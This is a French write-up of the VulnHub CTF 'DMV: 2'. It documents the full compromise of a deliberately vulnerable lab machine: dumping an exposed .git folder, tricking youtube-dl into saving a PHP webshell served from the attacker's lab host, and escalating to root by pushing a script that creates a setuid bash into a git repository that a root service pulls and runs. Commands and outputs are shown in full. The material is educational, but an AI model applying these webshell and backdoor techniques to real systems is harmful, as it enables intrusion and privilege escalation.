# Solution du CTF DMV #2 de VulnHub

Le CTF [DMV: 2](https://www.vulnhub.com/entry/dmv-2,474/) était intéressant et original. Il m'a d'ailleurs donné du fil à retordre. L'auteur a trouvé quelques bonnes idées qui changent de d'habitude.

```
Nmap scan report for 192.168.56.68
Host is up (0.00045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 651bfc741039dfddd02df0531ceb6dec (RSA)
|   256 c42804a5c3b96a955a4d7a6e46e214db (ECDSA)
|_  256 ba07bbcd424af293d105d0b34cb1d9b1 (ED25519)
80/tcp   open  http         Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-git: 
|   192.168.56.68:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: DMV 2.0 
|     Remotes:
|_      ssh://developerdmv@127.0.0.1/home/developerdmv/site.git/
|_http-server-header: Apache/2.4.29 (Ubuntu)
4545/tcp open  worldscores?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck: 
|     ========== Welcome to DMV Admin ==========
|     Select product to update:
|     Main site
|     Admin
|     other) Exit
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     ========== Welcome to DMV Admin ==========
|     Select product to update:
|     Main site
|     Admin
|     other) Exit
|_    Invalid choice
```

## Ta mère elle va dumper

Je note la présence d'un dosier `.git` à la racine du site. Ni une ni deux je tente [git-dumper: A tool to dump a git repository from a website](https://github.com/arthaud/git-dumper) mais ce dernier crashe.

Finalement j'aurais plus de succès avec [GitDump: A pentesting tool that dumps the source code from .git even when the directory traversal is disabled](https://github.com/Ebryx/GitDump) qui est pourtant moins récent :

```shellsession
$ python git-dump.py http://192.168.56.68/.git/
URL for test: http://192.168.56.68/.git/
Fetching: http://192.168.56.68/.git/index
Fetching: http://192.168.56.68/.git/FETCH_HEAD
Fetching: http://192.168.56.68/.git/HEAD
Fetching: http://192.168.56.68/.git/ORIG_HEAD
Fetching: http://192.168.56.68/.git/config
Fetching: http://192.168.56.68/.git/description
Fetching: http://192.168.56.68/.git/packed-refs
Fetching: http://192.168.56.68/.git/info/exclude
Fetching: http://192.168.56.68/.git/info/refs
Fetching: http://192.168.56.68/.git/logs/HEAD
Fetching: http://192.168.56.68/.git/logs/refs/heads/develop
Fetching: http://192.168.56.68/.git/logs/refs/heads/master
Fetching: http://192.168.56.68/.git/logs/refs/remotes/origin/develop
Fetching: http://192.168.56.68/.git/logs/refs/remotes/origin/step_develop
Fetching: http://192.168.56.68/.git/logs/refs/remotes/origin/master
Fetching: http://192.168.56.68/.git/logs/refs/remotes/github/master
Fetching: http://192.168.56.68/.git/refs/heads/develop
Fetching: http://192.168.56.68/.git/refs/remotes/origin/develop
Fetching: http://192.168.56.68/.git/refs/heads/master
Fetching: http://192.168.56.68/.git/refs/remotes/origin/step_develop
Fetching: http://192.168.56.68/.git/refs/remotes/github/master
Fetching: http://192.168.56.68/.git/objects/info/packs
Fetching: http://192.168.56.68/.git/refs/remotes/origin/master
Fetching: http://192.168.56.68/.git/refs/remotes/origin/HEAD
Parsing Index File
Fetching: http://192.168.56.68/.git/objects/47/b639702ccbb7cc5ce9c38556560b617e604fcd
Fetching: http://192.168.56.68/.git/objects/77/bb51c7a9c58ca7da8161b9cbcfb098c519ae09
Fetching: http://192.168.56.68/.git/objects/dc/29515021bb64943226019ef14cd0a9ce940907
Fetching: http://192.168.56.68/.git/objects/c7/8b76780fe411eb7786a15b99fc02c05cc1c1f5
Fetching: http://192.168.56.68/.git/objects/a5/5129286e6535d241fdcec8433f29915bcf2595
Fetching: http://192.168.56.68/.git/objects/3f/ec32c842751033d92c8967eba40c3911333a78
Fetching: http://192.168.56.68/.git/objects/5a/928f6da25ac6d6ba65480b76d03a71cb906138
Fetching: http://192.168.56.68/.git/objects/13/6beafb81ce4aa2b0b9225df70a4cd06f7e7940
Fetching: http://192.168.56.68/.git/objects/2a/89468d12d2133daa2354a9dd28cf52ae0548cd
Fetching: http://192.168.56.68/.git/objects/d3/4bb4259d9acb437d9f089aaa6f25343bb2611c
Fetching: http://192.168.56.68/.git/objects/00/00000000000000000000000000000000000000
Fetching: http://192.168.56.68/.git/objects/69/64f6c4d5750690695312138bdfa70338195d5a
Fetching: http://192.168.56.68/.git/objects/08/1b5357b1dffb3ff3f1a486907b6ff86207a6a8
Fetching: http://192.168.56.68/.git/objects/2a/e9352c194523e3fbdc50ade4bcd620162d9016
Fetching: http://192.168.56.68/.git/objects/9b/643e869b2f4d5257ae8dcb82f0d6276d6a28b5
Fetching: http://192.168.56.68/.git/objects/99/8441a9bf12a5c61126a38b9aa92f7bdb3fed41
Script Executed Successfully
Run following command to retrieve source code: cd output && git checkout -- .
$ cd output/
$ git checkout -- .
erreur : unable to read sha1 file of images/mp3-file.png (6964f6c4d5750690695312138bdfa70338195d5a)
erreur : unable to read sha1 file of images/youtube.png (2ae9352c194523e3fbdc50ade4bcd620162d9016)
erreur : unable to read sha1 file of js/jquery-3.5.0.min.js (47b639702ccbb7cc5ce9c38556560b617e604fcd)
erreur : unable to read sha1 file of js/main.js (9b643e869b2f4d5257ae8dcb82f0d6276d6a28b5)
```

J'ai aussi lancé en parallèle un `Feroxbuster` qui m'a trouvé plusieurs dossiers :

```
301        9l       28w      315c http://192.168.56.68/images
301        9l       28w      311c http://192.168.56.68/js
301        9l       28w      312c http://192.168.56.68/tmp
403        9l       28w      278c http://192.168.56.68/server-status
200       21l       61w      842c http://192.168.56.68/
403        9l       28w      278c http://192.168.56.68/tmp/downloads/
```

Grace au dump j'obtiens la page d'index PHP du site. Je ne met pas la totalité du fichier ci-dessous mais le site ressemble comme deux goutes d'eau à celui du [DMV #1](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20DMV%20%231%20de%20VulnHub.md).

La description du CTF mentionne quand même :

> This time I am going to complicate things for you, I have fixed all the bugs and now my website is 100% secure, I challenge you to hack it

En effet on voit que le script récupère un paramètre `yt_url` sur lequel tous les caractères dangereux du bash sont proprement échappés :

```php
<?php                                                                                                                  
                                                                                                                       
if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' && $_SERVER['REQUEST_METHOD'] === 'POST')
{                                                                                                                      
   $yt_url = explode(" ", $_POST["yt_url"])[0];                                                                        
   $id = uniqid();                                                                                                     
   $filename = $id.".%(ext)s";                                                                                         
   $template = '/var/www/html/tmp/downloads/'. $filename;                                                              
   $string = ('youtube-dl --restrict-filenames --extract-audio --audio-format mp3 ' . escapeshellarg($yt_url) . ' -o ' . escapeshellarg($template));
                                                                                                                       
   $descriptorspec = array(                                                                                            
      0 => array("pipe", "r"),  // stdin                                                                               
      1 => array("pipe", "w"),  // stdout                                                                              
      2 => array("pipe", "w"),  // stderr                                                                              
   );                                                                                                                  
                                                                                                                       
   $process = proc_open($string, $descriptorspec, $pipes);                                                             
   $stdout = stream_get_contents($pipes[1]);                                                                           
   fclose($pipes[1]);                                                                                                  
   $stderr = stream_get_contents($pipes[2]);                                                                           
   fclose($pipes[2]);                                                                                                  
   $ret = proc_close($process);                                                                                        
   echo json_encode(array(                                                                                             
      'status' => $ret,                                                                                                
      'errors' => $stderr,                                                                                             
      'url_orginal'=>$yt_url,                                                                                          
      'output' => "",                                                                                                  
      'result_url'=> '/tmp/downloads/'.$id . '.mp3',                                                                   
   ));                                                                                                                 
   die();                                                                                                              
}                                                                                                                      
                                                                                                                       
?>
```

## Text2Speech

Pour résumer le script fait (comme sur le précédent CTF) appel à `youtube-downloader` pour extraire le son d'une URL et écrire le résultat dans un fichier spécifié par l'option `-o`.

On ne dispose pas vraiment de contrôle sur le nom du fichier de sortie. La base du nom est généré aléatoirement et l'extension est vraiment bizarre. Il m'a fallut un moment avant de comprendre que c'était une notation spécifique à [youtube-dl](https://github.com/ytdl-org/youtube-dl/blob/master/README.md#output-template).

On a tout de même une vulnérabilité de SSRF mais les tentatives de spécifier un fichier local du système (avec `file://`) sont refusées par `youtube-dl` lui même.

J'ai installé `youtube-dl` pour faire des tests en local et le logiciel lit une URL, télécharge le fichier puis effectue une conversion à l'aide de `ffmpeg`. Je me suis rappelé que `ffmpeg` était touché par une vulnérabilité qui concernait la façon dont il gérait les fichiers de playlist au format `m3u` :

[phdays ffmpeg - Google Slides](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g1e02c07a78_0_15)

Il y a même un exploit ici :

[GitHub - neex/ffmpeg-avi-m3u-xbin](https://github.com/neex/ffmpeg-avi-m3u-xbin)

Mais toutes les tentatives ont mené à l'échec.

Il semblait évident après plus de temps passé que tout tournait autour du template de nom `%(ext)s` qui applique un suffixe en fonction du type de fichier que le logiciel a détecté.

J'ai eu beaucoup de tentatives où `youtube-dl` refusait catégoriquement de traiter le fichier et d'autres où j'essayer de créer des fichiers hybrides de MP3 et de PHP mais j'obtenais systématiquement un fichier MP3.

Comme le logiciel émet d'abord une requête `HTTP HEAD` avant de faire un `HTTP GET` j'ai écrit à un moment un script qui affichait la méthode HTTP utilisée et j'ai été surpris de voir que... ça y est ! Il avait pris directement le suffixe `.php`.

Voici à quoi ressemblait mon script PHP :

```php
<?php
echo $_SERVER['REQUEST_METHOD'];
echo '<?php system($_GET["cmd"]); ?>';
?>
```

Et l'exécution en local :

```shellsession
$ youtube-dl --restrict-filenames --extract-audio --audio-format=mp3  "http://192.168.56.1/getmethod.php" -o "yolo.%(ext)s"
[generic] getmethod: Requesting header
WARNING: Falling back on generic information extractor.
[generic] getmethod: Downloading webpage
WARNING: URL could be a direct video link, returning it as such.
[download] Destination: yolo.php
[download] 100% of 33.00B in 00:00
ERROR: WARNING: unable to obtain file audio codec with ffprobe
```

Maintenant il faut se servir de l'API du site pour reproduire l'explotation :

```shellsession
$ curl -H "X-REQUESTED-WITH: xmlhttprequest" -XPOST  --data 'yt_url=http://192.168.56.1/getmethod.php' http://192.168.56.68/
{
  "status":1,
  "errors":"WARNING: Falling back on generic information extractor.\nWARNING: URL could be a direct video link, returning it as such.\nERROR: WARNING: unable to obtain file audio codec with ffprobe\n",
  "url_orginal":"http:\/\/192.168.56.1\/getmethod.php",
  "output":"",
  "result_url":"\/tmp\/downloads\/6389b2b8581b0.mp3"
}
```

Comme le script a la gentilesse de nous fournir l'identifiant aléatoire j'ai retrouvé mon webshell à l'emplacement `/tmp/downloads/6389b2b8581b0.php`. Enfiiiiiiin !

## git commit -m "exécute mon truc"

Je n'ai pas encore parlé du service custom sur le port 4545. Ce service offre deux choix, voici le comportement sur le premier :

```shellsession
$ ncat 192.168.56.68 4545 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.68:4545.
========== Welcome to DMV Admin ==========
Select product to update:
1) Main site
2) DMV Admin
other) Exit
1
Output:
From ssh://127.0.0.1/home/developerdmv/site
 * branch            master     -> FETCH_HEAD
Already up to date.
```

On retiendra juste à ce stade qu'il y a certainement un compte utilisateur nommé `developerdmv`. Sur le second choix il semble se passer quelque chose mais rien n'apparait à l'affichage.

Dans tous les cas j'ai rappatrié un reverse-ssh pour upgrader vers un shell avec PTY :)

Situation étrange, déjà `/var/www` appartenait à `www-data` et non à `root` et deuxièmement  le compte dispose d'une clé SSH :

```shellsession
www-data@dmv2:/var/www$ ls .ssh/        
total 20K
drwx------ 2 www-data www-data 4.0K Apr 28  2020 .
drwxr-xr-x 5 www-data www-data 4.0K Apr 28  2020 ..
-rw------- 1 www-data www-data 1.7K Apr 28  2020 id_rsa
-rw-r--r-- 1 www-data www-data  394 Apr 28  2020 id_rsa.pub
-rw-r--r-- 1 www-data www-data  222 Apr 28  2020 known_hosts
```

Si on ajoute à ça le fait que `developerdmv` dispose d'un fichier `authorized_keys` world-readable dans lequel on voit la mention de `www-data` :

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCujN4AdgBFwKUHGXoqxK9PzVqsLN0Be2V3aD8ks/09J66KdghB0/JWUefWz0P6WWdgMvD4O0FEPMJ/kt4y7qNLTvR2JJIkUWm0IzXH2Q2TZ7bApw33fmw9JYIw8KqLgu2j42HLkLE5iETdnP3sw5RMKSnl8q9jtWS7XxxP9hXr5LvTSgg3B7Dkua1sB544vtsYGypkgj1cHxitCZzu3IOTbpO6CT4Gq2lwAgIJq7FkXLyNeXz5eiWOLgj/+3BRkyTO+45CFIoRBH+bQ3suAI7vMHLt14/iDyVdlKSGJSXEfGAcPNgdU3XmWHCnZihK8X0LQwFTa9/kbKuiVv+/tcD/ www-data@dmv
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC53DHePvfofYjl8PY+Ow1kTCxorls9IvxJQnfGGaTP1zfRkeLj5YImgokzGYjn4QlksPoBxXVdIj2Fd6m3ofrX3S62JkPIlmOsbhZkTtexCM/2Y3p32G9nVo5kMpdeKdopQlcrBA+HteZXQEXwFgKdent2X+ttXZLy7WA9lnTmiGc8BIvwD9IBH7Hgmxmkc/FbxP6iTbe/aDu3/GzAlsfxXFjnhnfrvYKof44MKi+FzQeCON9nvzy1GTCgZd/VhnaJlI2LSevybk3jyqM8oSJy2kuv66naUWXiHnVhUT/MrKUn7dQsTnU+yNE2RO1xQMFFEYhi+s68jK1R2s3xERuD root@dmv
```

On en déduit qu'on peut passer `developerdmv` par une simple connexion SSH et c'est le cas :)

J'ai récupéré le premier flag :

```shellsession
flag{4e6ca045796244b1aadc36458dd48f3a}
```

Puis remarqué dans les process ce qui fait tourner le port 4545 :

```
root      8704  0.0  0.3  11668  3072 ?        Ss   Dec01   0:00 /bin/bash /etc/dmvservice.sh
root      8716  0.0  0.2 703808  2216 ?        Sl   Dec01   0:00 ./root/admin/admin
```

Le script bash est tout simple :

```bash
#!/bin/bash
chmod +x /root/admin/admin && ./root/admin/admin
```

Mais on ne dispose pas de droits suffisants pour aller analyser le binaire (ou script) `admin`.

Comme il fait vraisemblablement des appels externes j'ai lancé [pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy) sur le système pendant que je me connectais au port 4545 pour tester les deux choix.

Voici l'activité pour le premier choix :

```
2022/12/02 13:10:44 CMD: UID=0    PID=12791  | /bin/bash -c cd /var/www/html/ && git checkout . && git pull origin master 
2022/12/02 13:10:44 CMD: UID=0    PID=12794  | git pull origin master 
2022/12/02 13:10:44 CMD: UID=0    PID=12796  | sshd: [accepted]     
2022/12/02 13:10:44 CMD: UID=0    PID=12795  | /usr/bin/ssh developerdmv@127.0.0.1 git-upload-pack '/home/developerdmv/site.git/' 
2022/12/02 13:10:44 CMD: UID=110  PID=12797  | sshd: [net]          
2022/12/02 13:10:45 CMD: UID=1000 PID=12799  | (sd-pam) 
2022/12/02 13:10:45 CMD: UID=1000 PID=12798  | /lib/systemd/systemd --user 
--- snip ---
2022/12/02 13:10:46 CMD: UID=0    PID=12884  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot 
2022/12/02 13:10:46 CMD: UID=0    PID=12886  | date +%s 
2022/12/02 13:10:46 CMD: UID=1000 PID=12890  | bash -c git-upload-pack '/home/developerdmv/site.git/' 
2022/12/02 13:10:46 CMD: UID=1000 PID=12889  | sshd: developerdmv@notty
2022/12/02 13:10:46 CMD: UID=1000 PID=12893  | /bin/kill -s 58 12798 
2022/12/02 13:10:46 CMD: UID=0    PID=12895  | /usr/lib/git-core/git merge FETCH_HEAD
```

Et ceci pour le second choix :

```
2022/12/02 13:14:02 CMD: UID=0    PID=12900  | git checkout . 
2022/12/02 13:14:02 CMD: UID=0    PID=12899  | /bin/bash -c cd /root/admin/ && git checkout . && git pull origin master && systemctl restart dmvadmin 
2022/12/02 13:14:02 CMD: UID=0    PID=12903  | git pull origin master 
2022/12/02 13:14:02 CMD: UID=0    PID=12902  | git pull origin master 
2022/12/02 13:14:02 CMD: UID=0    PID=12904  | 
--- sip ---
2022/12/02 13:14:04 CMD: UID=0    PID=12997  | run-parts --lsbsysinit /etc/update-motd.d 
2022/12/02 13:14:04 CMD: UID=1000 PID=12998  | sshd: developerdmv   
2022/12/02 13:14:04 CMD: UID=1000 PID=12999  | git-upload-pack /home/developerdmv/admin.git/ 
2022/12/02 13:14:04 CMD: UID=0    PID=13000  | /usr/lib/git-core/git rev-list --objects --stdin --not --all --quiet 
2022/12/02 13:14:04 CMD: UID=0    PID=13003  | /usr/lib/git-core/git fetch --update-head-ok origin master 
2022/12/02 13:14:04 CMD: UID=0    PID=13004  | /usr/lib/git-core/git merge FETCH_HEAD 
2022/12/02 13:14:04 CMD: UID=0    PID=13017  | ./root/admin/admin 
2022/12/02 13:14:04 CMD: UID=0    PID=13015  | /lib/systemd/systemd-udevd 
--- snip ---
2022/12/02 13:14:04 CMD: UID=0    PID=13006  | /lib/systemd/systemd-udevd 
2022/12/02 13:14:04 CMD: UID=0    PID=13005  | /bin/bash /etc/dmvservice.sh
```

Or l'utilisateur `developerdmv` dispose de deux répos git dans son home :

```
drwxrwxr-x 7 developerdmv developerdmv 4096 Dec  2 15:07 admin.git
drwxrwxr-x 7 developerdmv developerdmv 4096 Apr 28  2020 site.git
```

On voit dans les activités précédentes que un `git checkout` de root semble provoquer l'accès à l'un des repository de `developerdmv`.

En particulier sur le second choix l'utilisateur `checkout` le project `admin` et ensuite exécute le binaire `admin` qui est présent à l'intérieur.

Je vais donc cloner le projet dans `/tmp` et jeter un oeil à ce qui s'y trouve (dans `/home/developerdmv/admin.git/` on ne voit pas les fichiers tels quels, juste les objets Git) :

```shellsession
developerdmv@mv2:/tmp$ git clone /home/developerdmv/admin.git/ admincopy
Cloning into 'admincopy'...
done.
developerdmv@dmv2:/tmp$ cd admincopy/
developerdmv@dmv2:/tmp/admincopy$ git status
On branch master
Your branch is up to date with 'origin/master'.

nothing to commit, working tree clean
developerdmv@dmv2:/tmp/admincopy$ ls
admin  go.mod  main.go
developerdmv@dmv2:/tmp/admincopy$ file admin
admin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

On dispose du code source du binaire dans `main.go` :

```go
package main

import (
        "bufio"
        "fmt"
        "net"
        "os/exec"
        "strconv"
        "strings"
)

func execCommand(command string) ([]byte, error) {
        cmd := exec.Command("/bin/bash", "-c", command)
        return cmd.CombinedOutput()
}

func handleConnection(c net.Conn) {
        fmt.Printf("Serving %s\n", c.RemoteAddr().String())

        for {
                c.Write([]byte("========== Welcome to DMV Admin ==========\n"))
                c.Write([]byte("Select product to update:\n"))
                c.Write([]byte("1) Main site\n"))
                c.Write([]byte("2) DMV Admin\n"))
                c.Write([]byte("other) Exit\n"))
                netData, err := bufio.NewReader(c).ReadString('\n')
                if err != nil {
                        fmt.Println(err)
                        return
                }

                choice := strings.TrimSpace(string(netData))
                intChoice, err := strconv.Atoi(choice)
                if err != nil {
                        // handle error
                        c.Write([]byte("Invalid choice\n"))
                        break
                }

                var out []byte
                var cmdErr error

                switch intChoice {
                case 1:
                        out, cmdErr = execCommand("cd /var/www/html/ && git checkout . && git pull origin master")
                case 2:
                        out, cmdErr = execCommand("cd /root/admin/ && git checkout . && git pull origin master && systemctl restart dmvadmin")
                default:
                        c.Write([]byte("Invalid choice\n"))
                        break
                }
                if out != nil {
                        c.Write([]byte("Output:\n"))
                        c.Write(out)
                }

                if cmdErr != nil {
                        c.Write([]byte(fmt.Sprintf("Failed: %s\n", cmdErr)))
                }
        }
        c.Close()
}

func main() {
        port := ":4545"
        l, err := net.Listen("tcp", port)
        if err != nil {
                fmt.Println(err)
                return
        }
        defer l.Close()
        for {
                c, err := l.Accept()
                if err != nil {
                        fmt.Println(err)
                        return
                }
                go handleConnection(c)
        }
}
```

C'est le service qui écoute sur le port 4545. On remarque qu'après le `checkout` et `pull` il redémarre le service `dmvadmin` que voilà :

```systemd
[Unit]
Description=DMV Admin Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/bin/bash /etc/dmvservice.sh

[Install]
WantedBy=multi-user.target
```

Et le script shell mentionné exécute `/root/admin/admin` comme on l'a vu plus tôt.

Par conséquent je vais écraser le binaire `admin` dans le projet, le `commit` et `push` puis déclencher l'action en sélectionnant le choix 2 sur le port 4545 :

```shellsession
developerdmv@dmv2:/tmp/admincopy$ cp admin /tmp/admin_bak
developerdmv@dmv2:/tmp/admincopy$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/\nchmod 4755 /tmp/bash' > admin
developerdmv@dmv2:/tmp/admincopy$ git status
On branch master
Your branch is up to date with 'origin/master'.

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

        modified:   admin

no changes added to commit (use "git add" and/or "git commit -a")
developerdmv@dmv2:/tmp/admincopy$ git add admin 
developerdmv@dmv2:/tmp/admincopy$ git commit -m "Hacking the Gibson"
[master 4a0c800] Hacking the Gibson
 1 file changed, 0 insertions(+), 0 deletions(-)
 rewrite admin (99%)
developerdmv@dmv2:/tmp/admincopy$ git push
Counting objects: 3, done.
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 348 bytes | 87.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0)
To /home/developerdmv/admin.git/
   d364a80..4a0c800  master -> master
```

Et ma version a bien été exécutée, m'offrant un binaire setuid root :

```shellsession
developerdmv@dmv2:/tmp/admincopy$ ls /tmp/bash -al
-rwsr-xr-x 1 root root 1113504 Dec  2 15:09 /tmp/bash
developerdmv@dmv2:/tmp/admincopy$ /tmp/bash -p
bash-4.4# id
uid=1000(developerdmv) gid=1000(developerdmv) euid=0(root) groups=1000(developerdmv)
bash-4.4# cd /root
bash-4.4# ls
admin  root.txt
bash-4.4# cat root.txt
88888888ba,    88b           d88  8b           d8         ad888888b,  
88      `"8b   888b         d888  `8b         d8'        d8"     "88  
88        `8b  88`8b       d8'88   `8b       d8'                 a8P  
88         88  88 `8b     d8' 88    `8b     d8'               ,d8P"   
88         88  88  `8b   d8'  88     `8b   d8'  aaaaaaaa    a8P"      
88         8P  88   `8b d8'   88      `8b d8'   """"""""  a8P'        
88      .a8P   88    `888'    88       `888'             d8"          
88888888Y"'    88     `8'     88        `8'              88888888888  
                                                                      
====================================================================
                          Twitter: @over_jt
====================================================================

FLAG{a8ac60c0cfaf4617a7833c67e81d1512}
```

*Publié le 2 décembre 2022*
